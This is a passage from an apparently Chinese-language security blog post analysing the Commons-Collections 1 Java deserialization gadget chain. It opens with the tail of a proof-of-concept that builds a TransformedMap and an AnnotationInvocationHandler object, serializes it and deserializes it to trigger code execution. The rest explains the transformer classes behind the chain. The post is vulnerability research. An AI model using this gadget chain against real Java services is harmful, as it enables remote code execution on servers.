class="line">        <span class="comment">//用Transformer数组实例化Transformer链</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    </span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//为map绑定Transformer链，生成TransformedMap</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//通过反射找到 漏洞触发类AnnotationInvocationHandler的class对象</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取漏洞触发类AnnotationInvocationHandler的实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化漏洞触发对象，执行恶意的转换逻辑</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="4-TransformedMap介绍"><a href="#4-TransformedMap介绍" class="headerlink" title="4. TransformedMap介绍"></a>4. TransformedMap介绍</h4><ul>
<li><p>java.util.Map 是一个接口，<strong><u>简称</u></strong>为Map，jdk中有不同的实现，<strong><u>这里统称</u></strong>为jdk_map_impl（如HashMap），是<strong><u>键值对</u></strong>的集合</p>
</li>
<li><p>org.apache.commons.collections.map.TransformedMap <strong><u>简称</u></strong> TransformedMap ，是common-collection对Map的<strong><u>实现</u></strong>，可以对jdk中的Map的<strong><u>实现</u></strong>进行<strong><u>增强</u></strong>。</p>
</li>
<li><p>怎么增强？TransformedMap可以 为jdk_map_impl(如HashMap)绑定一个KEY的Transformer和一个VALUE的Transformer，在向jdk_map_impl类型的对象<strong><u>写入键值对之前</u></strong>，会<strong><u>先调用</u></strong>其绑定的KEY和VALUE的Transformer.transform转换为新的KEY’和VALUE’后再写入，代码如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TransformedMap最终会间接继承AbstractMapDecorator一个map字段，并在调用TransformedMap.decorate的时候初始化它。AbstractMapDecorator实现了java.util.Map接口。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">transient</span> Map map;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Entry entry, AbstractInputCheckedMapDecorator parent)</span> 		</span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//实现了java.util.Map.Entry接口的setValue方法。可以给Map中某一键值对赋值。</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//调用TransformedMap.checkSetValue得到转换后的value对象</span></span><br><span class="line">            value = <span class="keyword">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用静态方法TransformedMap.decorate，构造出一个TransformedMap对象。decorate有三个参数，可以将一个java.util.Map和key/value的Transformer绑定。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">transformKey</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.keyTransformer == <span class="keyword">null</span> ? object : <span class="keyword">this</span>.keyTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer == <span class="keyword">null</span> ? object : <span class="keyword">this</span>.valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//调用valueTransformer.transform对value对象进行转换</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//TransformedMap在对map字段进行填充时，会先调用相应的Transformer接口的transform方法对key/value对象进行转换。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">        key = <span class="keyword">this</span>.transformKey(key);</span><br><span class="line">        value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>Transformer有多种实现，这里只关注三种。</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622623055344-1623304151023.png" alt="1622623055344"></p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Transformer.transform输入一个类型的对象，转换成另一个类型的对象。</span></span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//设置要转换的目标对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//将传入对象转换为固定的目标对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//设置转换方法名和参数列表</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//设置转换方法名和参数列表</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//传入对象，反射调用转换方法，返回转换后的对象，转换方法由传入对象的类定义。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">		Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">		<span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//设置一个Transformer链</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//遍历Transformer链，传入对象经多个Transformer依次处理后返回</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">          object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  InvokerTransformer转换对象的流程如下(custom_method由in_obj的类自定义)：<br>  <img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622623085984-1623304151023.png" alt="1622623085984"></p>
<p>  ChainedTransformer转换对象的流程如下：</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622623120376-1623304151023.png" alt="1622623120376"></p>
<p><strong>poc来自</strong>：<a href="https://xz.aliyun.com/t/7031" target="_blank" rel="noopener"> JAVA反序列化 - Commons-Collections组件</a></p>
<p>在<strong>藏青</strong>师傅的建议下，通过cc1入门了一下反序列化漏洞</p>
<p>分析漏洞很多思路来源于和<strong>Mmuzz</strong>师傅的讨论，果然分布式学习是第一生产力！！！</p>
<p>第一次写文章超级痛苦，<strong>瓜哥</strong>给了很多行文上的指导</p>
<p>一直没能改的比较满意，但是再拖下去要被<strong>藏青</strong>师傅打死了，就这样先发了（才不是因为写不下去了</p>
<p>漏洞分析两小时，文章写一周</p>
<p>果然写文章是阻碍进步的究极原因啊（不是</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>